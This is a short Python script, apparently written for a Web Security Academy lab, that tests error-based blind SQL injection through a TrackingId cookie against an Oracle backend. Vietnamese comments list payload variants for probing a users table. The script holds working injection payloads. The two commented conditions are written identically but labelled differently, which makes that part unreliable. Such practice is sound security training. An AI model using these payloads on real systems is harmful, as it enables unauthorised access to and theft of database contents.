import requests
url = "https://0ad30044044925ba80cb1725008c00f3.web-security-academy.net/"

trackingId = "eR3hoiUgWhRNtCW3"
payload = f"""{trackingId}'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"""

cookie = {
    "session": "4yFDsLwlH1LD6itETdND3NP20J8APo0B",
    "TrackingId": payload
}
response = requests.get(url, cookies=cookie)
if response.status_code == 200:
    print(f"[+] No Error")
else:
    print(f"[-] Error")

# Điều kiện 1 kiểm tra có bảng users tồn tại 1 dòng k: f"""{trackingId}'||(SELECT '' FROM users WHERE ROWNUM)||'"""
# Kiểm tra 2 điều kiện khác nhau kích hoạt lỗi hoặc không lỗi:
# 1: f"""{trackingId}'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'""" : Not Lỗi
# 2. f"""{trackingId}'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'""" : Lỗi
# Đã biết được cách hoạt động viết script trích xuất dữ liệu